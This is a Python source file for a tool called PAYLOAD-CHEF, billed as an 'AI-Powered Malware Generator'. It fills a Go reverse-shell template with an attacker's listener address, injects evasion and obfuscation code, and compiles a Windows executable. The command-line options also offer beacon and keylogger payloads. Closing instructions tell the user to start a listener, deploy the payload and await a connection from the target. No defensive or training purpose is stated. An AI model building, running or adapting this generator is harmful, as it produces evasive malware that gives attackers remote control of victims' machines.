#!/usr/bin/env python3
"""
PAYLOAD-CHEF - AI-Powered Malware Generator
Python Orchestrator + Go Native Payloads
"""

import argparse
import sys
import os
from pathlib import Path
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.panel import Panel
from rich import print as rprint
import time

# Add builders to path
sys.path.insert(0, str(Path(__file__).parent / "builders"))
sys.path.insert(0, str(Path(__file__).parent / "core"))

from go_builder import GoBuilder

console = Console()

class PayloadChef:
    def __init__(self):
        self.templates_dir = Path(__file__).parent / "templates"
        self.output_dir = Path(__file__).parent / "output"
        self.output_dir.mkdir(exist_ok=True)
        
        self.builder = GoBuilder()
    
    def generate_reverse_shell(self, lhost, lport, output_name="payload.exe", evasion_level="medium"):
        """Generate reverse shell payload with fancy UI"""
        
        # Show configuration panel
        config_table = Table(show_header=False, box=None, padding=(0, 2))
        config_table.add_row("[cyan]Target Host[/cyan]", f"[yellow]{lhost}[/yellow]")
        config_table.add_row("[cyan]Target Port[/cyan]", f"[yellow]{lport}[/yellow]")
        config_table.add_row("[cyan]Evasion Level[/cyan]", f"[magenta]{evasion_level.upper()}[/magenta]")
        config_table.add_row("[cyan]Output File[/cyan]", f"[green]{output_name}[/green]")
        
        console.print(Panel(config_table, title="[bold red]⚡ Payload Configuration[/bold red]", border_style="red"))
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            console=console
        ) as progress:
            
            # Step 1: Load template
            task1 = progress.add_task("[cyan]Loading Go template...", total=100)
            template_path = self.templates_dir / "reverse_shell.go"
            with open(template_path, "r") as f:
                template_code = f.read()
            progress.update(task1, advance=100)
            
            # Step 2: Inject configuration and evasion
            task2 = progress.add_task(f"[yellow]Injecting config + {evasion_level} evasion...", total=100)
            payload_code = template_code.replace("{{LHOST}}", lhost)
            payload_code = payload_code.replace("{{LPORT}}", lport)
            
            # Inject evasion techniques dynamically
            import sys
            sys.path.insert(0, str(self.templates_dir.parent / "core"))
            from evasion_injector import EvasionInjector
            
            injector = EvasionInjector()
            payload_code = injector.inject(payload_code, evasion_level)
            progress.update(task2, advance=100)
            
            # Step 3: Apply obfuscation
            if evasion_level != "none":
                task3 = progress.add_task(f"[magenta]Applying {evasion_level} obfuscation...", total=100)
                
                import sys
                sys.path.insert(0, str(self.templates_dir.parent / "core"))
                from obfuscator import GoObfuscator
                
                obf = GoObfuscator(level=evasion_level)
                payload_code = obf.obfuscate(payload_code)
                progress.update(task3, advance=100)
            
            # Step 4: Write temp file
            task4 = progress.add_task("[blue]Writing temporary build file...", total=100)
            temp_file = self.output_dir / f"temp_{output_name}.go"
            with open(temp_file, "w") as f:
                f.write(payload_code)
            progress.update(task4, advance=100)
            
            # Step 5: Compile
            task5 = progress.add_task("[green]Compiling native binary...", total=100)
            output_path = self.output_dir / output_name
            success = self.builder.compile(
                str(temp_file),
                str(output_path),
                {"windows_gui": False}
            )
            progress.update(task5, advance=100)
            
            # Cleanup
            if temp_file.exists():
                pass # temp_file.unlink()
        
        # Show results
        if success:
            file_size = os.path.getsize(output_path) / 1024  # KB
            file_hash = self._get_file_hash(output_path)
            
            result_table = Table(show_header=False, box=None, padding=(0, 2))
            result_table.add_row("[cyan]File Path[/cyan]", f"[green]{output_path}[/green]")
            result_table.add_row("[cyan]File Size[/cyan]", f"[yellow]{file_size:.1f} KB[/yellow]")
            result_table.add_row("[cyan]SHA256[/cyan]", f"[dim]{file_hash}[/dim]")
            result_table.add_row("[cyan]Status[/cyan]", "[bold green]✓ READY FOR DEPLOYMENT[/bold green]")
            
            console.print("\n")
            console.print(Panel(result_table, title="[bold green]Payload Generated Successfully[/bold green]", border_style="green"))
            
            # Show usage instructions
            console.print("\n[bold cyan]Next Steps[/bold cyan]")
            console.print(f"[yellow]1.[/yellow] Start listener: [cyan]python listener.py {lport}[/cyan]")
            console.print(f"[yellow]2.[/yellow] Deploy payload: [cyan]{output_name}[/cyan]")
            console.print(f"[yellow]3.[/yellow] Await connection from target\n")
        else:
            console.print(Panel("[bold red]Payload generation failed[/bold red]", border_style="red"))
        
        return success
    
    def _get_file_hash(self, filepath):
        """Calculate SHA256 hash of file"""
        import hashlib
        sha256_hash = hashlib.sha256()
        with open(filepath, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()[:32]
    
    def list_templates(self):
        """List available payload templates with fancy table"""
        table = Table(title="[bold magenta]Available Payload Templates[/bold magenta]", show_header=True, header_style="bold cyan")
        table.add_column("ID", style="dim", width=6)
        table.add_column("Template Name", style="cyan")
        table.add_column("Type", style="yellow")
        table.add_column("Status", style="green")
        
        templates = list(self.templates_dir.glob("*.go"))
        for idx, template in enumerate(templates, 1):
            name = template.stem.replace("_", " ").title()
            table.add_row(
                f"[{idx}]",
                name,
                "Reverse Shell" if "shell" in template.stem else "Malware",
                "Ready"
            )
        
        console.print(table)

def print_banner():
    """Print fancy ASCII banner"""
    banner = """
[bold red]╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  [yellow]██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗[/yellow]  ║
║  [yellow]██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗[/yellow] ║
║  [yellow]██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║[/yellow] ║
║  [yellow]██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║[/yellow] ║
║  [yellow]██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝[/yellow] ║
║  [yellow]╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝[/yellow]  ║
║                                                              ║
║         [bold cyan]CHEF v1.0[/bold cyan] - Polymorphic Payload Generator         ║
║              [dim]Crimson Toolkit Component[/dim]                      ║
╚══════════════════════════════════════════════════════════════╝[/bold red]
"""
    rprint(banner)

def main():
    parser = argparse.ArgumentParser(
        description="PAYLOAD-CHEF - Polymorphic Payload Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
[bold cyan]Examples:[/bold cyan]
  payload-chef.py create --type reverse-shell --lhost 192.168.1.100 --lport 4444
  payload-chef.py create --type reverse-shell --lhost 10.0.0.5 --lport 443 --evasion high
  payload-chef.py list
        """
    )
    
    subparsers = parser.add_subparsers(dest="command", help="Commands")
    
    # Create command
    create_parser = subparsers.add_parser("create", help="Generate payload")
    create_parser.add_argument("--type", required=True, choices=["reverse-shell", "beacon", "keylogger"], help="Payload type")
    create_parser.add_argument("--lhost", help="Listener IP address")
    create_parser.add_argument("--lport", help="Listener port")
    create_parser.add_argument("--output", default="payload.exe", help="Output filename")
    create_parser.add_argument("--evasion", choices=["none", "low", "medium", "high"], default="medium", help="Evasion level")
    
    # List command
    list_parser = subparsers.add_parser("list", help="List templates")
    
    args = parser.parse_args()
    
    print_banner()
    
    chef = PayloadChef()
    
    if args.command == "create":
        if args.type == "reverse-shell":
            if not args.lhost or not args.lport:
                console.print("[bold red]Error:[/bold red] --lhost and --lport required for reverse shell")
                sys.exit(1)
            
            chef.generate_reverse_shell(args.lhost, args.lport, args.output, args.evasion)
        else:
            console.print(f"[bold yellow]Warning:[/bold yellow] Template '{args.type}' not yet implemented")
    
    elif args.command == "list":
        chef.list_templates()
    
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
